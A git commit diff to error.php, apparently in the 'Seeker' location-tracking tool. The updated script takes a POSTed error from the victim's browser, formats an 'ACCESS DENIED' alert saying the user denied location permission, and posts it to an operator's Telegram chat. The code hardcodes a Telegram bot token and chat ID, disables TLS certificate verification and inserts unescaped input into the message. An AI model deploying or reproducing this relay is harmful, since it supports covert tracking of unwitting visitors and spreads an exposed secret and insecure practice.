2a57ecc3b8e5a303aa8d19a11396a3b31275aa67
Sohail <76439991+asxhail@users.noreply.github.com>
2026-01-19 03:36:54 +0530

    Update error.php to send formatted Telegram messages
    Refactor error handling to send formatted messages to Telegram.

--- php/error.php
+++ php/error.php
@@ -1,10 +1,32 @@
 <?php
-header('Content-Type: text/html');
+// ******************************************
+// CONFIGURATION
+// ******************************************
 $botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM";
 $chatId = "6862649950";
+// ******************************************
 
 $err = $_POST['Error'];
-$msg = "⚠️ *Seeker Error:* \n$err";
-$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg) . "&parse_mode=Markdown";
-file_get_contents($url);
+
+// Format Message
+$message = "<b>⚠️ ACCESS DENIED</b>\n\n";
+$message .= "<b>Error:</b> " . $err . "\n";
+$message .= "The user likely denied location permission.";
+
+// Send to Telegram
+$website = "https://api.telegram.org/bot" . $botToken;
+$params = [
+    'chat_id' => $chatId,
+    'text' => $message,
+    'parse_mode' => 'HTML'
+];
+
+$ch = curl_init($website . '/sendMessage');
+curl_setopt($ch, CURLOPT_HEADER, false);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$result = curl_exec($ch);
+curl_close($ch);
 ?>
